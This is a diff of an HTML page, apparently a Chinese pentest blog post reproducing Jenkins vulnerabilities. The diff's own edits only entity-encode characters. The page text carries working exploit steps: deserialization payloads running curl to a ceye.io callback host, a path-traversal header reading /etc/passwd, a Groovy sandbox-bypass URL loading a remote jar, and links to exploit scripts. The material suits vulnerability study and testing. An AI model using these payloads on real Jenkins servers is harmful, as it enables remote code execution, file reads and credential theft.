@@ -138,7 +138,7 @@
 <p>利用需要X-Jenkins-CLI2-Port对应的端口，如果Jenkins无法获取CLI版本2的端口标头“ X-Jenkins-CLI2-Port”，它会退回到版本1。</p>
 <p>利用ys生成二进制文件：<code>java -jar ysoserial.jar CommonsCollections3 &quot;curl http://r9rub4.ceye.io/&quot; &gt; payload.bin</code></p>
 <p>利用脚本：<code>https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/jenkins.py</code></p>
-<p>发送的二进制文件实际上是十六进制的(&lt;===[JENKINS REMOTING CAPACITY]===&gt;)与其后base64的编码构成。使用类似反应如下：</p>
+<p>发送的二进制文件实际上是十六进制的(&lt;&#x3D;&#x3D;&#x3D;[JENKINS REMOTING CAPACITY]&#x3D;&#x3D;&#x3D;&gt;)与其后base64的编码构成。使用类似反应如下：</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145133.png" alt="image-20200327121322560"></p>
 <h3 id="CVE-2016-0792-低权限用户命令执行"><a href="#CVE-2016-0792-低权限用户命令执行" class="headerlink" title="CVE-2016-0792 低权限用户命令执行"></a>CVE-2016-0792 低权限用户命令执行</h3><p>影响版本：jenkins小于 1.650</p>
 <p>利用脚本：<code>https://github.com/jpiechowka/jenkins-cve-2016-0792</code></p>
@@ -147,7 +147,7 @@
 <h3 id="CVE-2016-9299-代码执行"><a href="#CVE-2016-9299-代码执行" class="headerlink" title="CVE-2016-9299 代码执行"></a>CVE-2016-9299 代码执行</h3><p>2.32之前的Jenkins和2.19.3之前的LTS中的远程处理模块允许远程攻击者通过精心制作的序列化Java对象执行任意代码，从而触发对第三方服务器的LDAP查询。</p>
 <p>关于这个漏洞的分析和代码利用，已经有详细的分析文章：<code>https://paper.seebug.org/199/</code></p>
 <p>msf有成熟的利用模块：<code>exploit/linux/misc/jenkins_ldap_deserialize</code></p>
-<h3 id="CVE-2017-1000353-Jenkins-CI-远程代码执行"><a href="#CVE-2017-1000353-Jenkins-CI-远程代码执行" class="headerlink" title="CVE-2017-1000353 Jenkins-CI 远程代码执行"></a>CVE-2017-1000353 Jenkins-CI 远程代码执行</h3><p>影响版本：Jenkins&lt;=2.56。Jenkins LTS &lt;= 2.46.1</p>
+<h3 id="CVE-2017-1000353-Jenkins-CI-远程代码执行"><a href="#CVE-2017-1000353-Jenkins-CI-远程代码执行" class="headerlink" title="CVE-2017-1000353 Jenkins-CI 远程代码执行"></a>CVE-2017-1000353 Jenkins-CI 远程代码执行</h3><p>影响版本：Jenkins&lt;&#x3D;2.56。Jenkins LTS &lt;&#x3D; 2.46.1</p>
 <p>下载poc<code>https://github.com/vulhub/CVE-2017-1000353</code></p>
 <p>执行生成字节码文件。</p>
 <pre class="line-numbers language-none"><code class="language-none">java  -jar  CVE-2017-1000353-SNAPSHOT-all.jar  jenkins_poc.ser  &quot;curl http:&#x2F;&#x2F;xxx.ceye.io&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -189,7 +189,7 @@ http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;git&#x2F;search&#x2F;suggest?query&#x3D;a<spa
 <p>需要已经开启了匿名用户读取权限，在请求头中添加</p>
 <pre class="line-numbers language-none"><code class="language-none">Accept-Language: &#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>处理请求中的包含路径，比如/plugin/xxxx，可以尝试</p>
+<p>处理请求中的包含路径，比如&#x2F;plugin&#x2F;xxxx，可以尝试</p>
 <pre class="line-numbers language-none"><code class="language-none">&#x2F;plugin&#x2F;jquery-detached&#x2F;.xml
 &#x2F;plugin&#x2F;jquery-detached&#x2F;.key
 &#x2F;plugin&#x2F;credentials&#x2F;.ini<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -218,7 +218,7 @@ Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span
 <p>查看DNSlog回显</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145507.png" alt="image-20200326173837239"></p>
 <h3 id="CVE-2019-1003000-远程代码执行"><a href="#CVE-2019-1003000-远程代码执行" class="headerlink" title="CVE-2019-1003000 远程代码执行"></a>CVE-2019-1003000 远程代码执行</h3><p>实际影响版本及编号：<strong>CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative)</strong></p>
-<p>拥有Overall/Read 权限的用户可以绕过沙盒保护，在jenkins可以执行任意代码。此漏洞需要一个账号密码和一个存在的job。受影响插件版本：Pipeline: Declarative 插件 &lt;= 1.3.4。Pipeline: Groovy 插 件 &lt;= 2.61。Script Security 插 件 &lt;= 1.49。</p>
+<p>拥有Overall&#x2F;Read 权限的用户可以绕过沙盒保护，在jenkins可以执行任意代码。此漏洞需要一个账号密码和一个存在的job。受影响插件版本：Pipeline: Declarative 插件 &lt;&#x3D; 1.3.4。Pipeline: Groovy 插 件 &lt;&#x3D; 2.61。Script Security 插 件 &lt;&#x3D; 1.49。</p>
 <p>下载环境和利用代码：<code> https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc.git</code></p>
 <p>执行利用后显示</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145513.png" alt="image-20200326112837107"></p>
@@ -255,15 +255,15 @@ Script Security Plugin 1.48<span aria-hidden="true" class="line-numbers-rows"><s
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <ol start="2">
-<li> 编译文件，创建META-INF/services/文件夹，同时在文件夹下创建名为org.codehaus.groovy.plugins.Runners的文件。内容随意，比如Payload</li>
-<li> 文件创建后，在某一目录下，文件树类似如下：</li>
+<li>编译文件，创建META-INF&#x2F;services&#x2F;文件夹，同时在文件夹下创建名为org.codehaus.groovy.plugins.Runners的文件。内容随意，比如Payload</li>
+<li>文件创建后，在某一目录下，文件树类似如下：</li>
 </ol>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145524.png" alt="image-20200327093359850"></p>
 <ol start="4">
-<li> 编译以上目录<code> jar cvf poc-1.jar code/</code></li>
-<li> 将编译产生的文件移动到类似如下地址<code>cp poc-1.jar ~/www/code/payload/poc/1/</code></li>
-<li> 将www目录移动到web服务器中，地址类似：<code>http://xxx.com/code/payload/poc/1.poc-1.jar</code></li>
-<li> 利用如下exp</li>
+<li>编译以上目录<code> jar cvf poc-1.jar code/</code></li>
+<li>将编译产生的文件移动到类似如下地址<code>cp poc-1.jar ~/www/code/payload/poc/1/</code></li>
+<li>将www目录移动到web服务器中，地址类似：<code>http://xxx.com/code/payload/poc/1.poc-1.jar</code></li>
+<li>利用如下exp</li>
 </ol>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;&lt;TARGET HOST&gt;&#x2F;securityRealm&#x2F;user&#x2F;admin&#x2F;descriptorByName&#x2F;org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition&#x2F;checkScriptCompile
 ?value&#x3D;
@@ -274,15 +274,15 @@ import Payload;<span aria-hidden="true" class="line-numbers-rows"><span></span><
 
 <h3 id="CVE-2019-1003029-Script-Security-Plugin沙箱绕过"><a href="#CVE-2019-1003029-Script-Security-Plugin沙箱绕过" class="headerlink" title="CVE-2019-1003029 Script Security Plugin沙箱绕过"></a>CVE-2019-1003029 Script Security Plugin沙箱绕过</h3><p>此漏洞和CVE-2019-1003005漏洞同样都是由Script Security插件引起。利用方式和上一致。影响版本1.55以下。</p>
 <h3 id="CVE-2019-10392-Jenkins-Git-插件命令执行"><a href="#CVE-2019-10392-Jenkins-Git-插件命令执行" class="headerlink" title="CVE-2019-10392 Jenkins Git 插件命令执行"></a>CVE-2019-10392 Jenkins Git 插件命令执行</h3><p>之前做过这个漏洞的复现，地址：<a href="https://misakikata.github.io/2019/09/CVE-2019-10392-Jenkins-2k19%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8BRCE/">https://misakikata.github.io/2019/09/CVE-2019-10392-Jenkins-2k19%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8BRCE/</a></p>
-<h3 id="CVE-2019-10352-任意文件写入"><a href="#CVE-2019-10352-任意文件写入" class="headerlink" title="CVE-2019-10352 任意文件写入"></a>CVE-2019-10352 任意文件写入</h3><p>该漏洞使经过身份验证的具有Job/Configure权限的攻击者可以使用目标之外的文件名定义文件参数，从而导致任意文件写入。</p>
-<p>创建一个名为test的新“自由式项目”（该项目的工作空间将位于JENKINS_HOME/workspace/test）</p>
+<h3 id="CVE-2019-10352-任意文件写入"><a href="#CVE-2019-10352-任意文件写入" class="headerlink" title="CVE-2019-10352 任意文件写入"></a>CVE-2019-10352 任意文件写入</h3><p>该漏洞使经过身份验证的具有Job&#x2F;Configure权限的攻击者可以使用目标之外的文件名定义文件参数，从而导致任意文件写入。</p>
+<p>创建一个名为test的新“自由式项目”（该项目的工作空间将位于JENKINS_HOME&#x2F;workspace&#x2F;test）</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145528.png" alt="image-20200327131927499"></p>
 <p>创建一个受限制的用户，提供总体读取和作业构建，配置和读取权限。在配置中选择文件参数</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145529.png" alt="image-20200327132432562"></p>
 <p>单击构建选择上传文件，上传一个1.png</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145532.png" alt="image-20200327132552837"></p>
 <p>开始构建就可以将其写入运行Jenkins的用户有权写入的文件系统上的任何位置。</p>
-<h3 id="CVE-2019-10300-GitLab插件信息泄露漏洞"><a href="#CVE-2019-10300-GitLab插件信息泄露漏洞" class="headerlink" title="CVE-2019-10300 GitLab插件信息泄露漏洞"></a>CVE-2019-10300 GitLab插件信息泄露漏洞</h3><p>Jenkins GitLab插件1.5.11 的功能中存在一个可利用的信息泄露漏洞。来自具有“ Overall/Read”权限的用户（例如，启用了匿名用户）的特制HTTP请求，可能导致该插件的受影响版本将Jenkins凭据数据库中的凭据公开给攻击者控制的服务器。</p>
+<h3 id="CVE-2019-10300-GitLab插件信息泄露漏洞"><a href="#CVE-2019-10300-GitLab插件信息泄露漏洞" class="headerlink" title="CVE-2019-10300 GitLab插件信息泄露漏洞"></a>CVE-2019-10300 GitLab插件信息泄露漏洞</h3><p>Jenkins GitLab插件1.5.11 的功能中存在一个可利用的信息泄露漏洞。来自具有“ Overall&#x2F;Read”权限的用户（例如，启用了匿名用户）的特制HTTP请求，可能导致该插件的受影响版本将Jenkins凭据数据库中的凭据公开给攻击者控制的服务器。</p>
 <p>需要下载插件：<code>https://mirrors.tuna.tsinghua.edu.cn/jenkins/plugins/gitlab-plugin/1.5.11/gitlab-plugin.hpi</code></p>
 <p>利用分析：<code>https://talosintelligence.com/vulnerability_reports/TALOS-2019-0788</code></p>
 
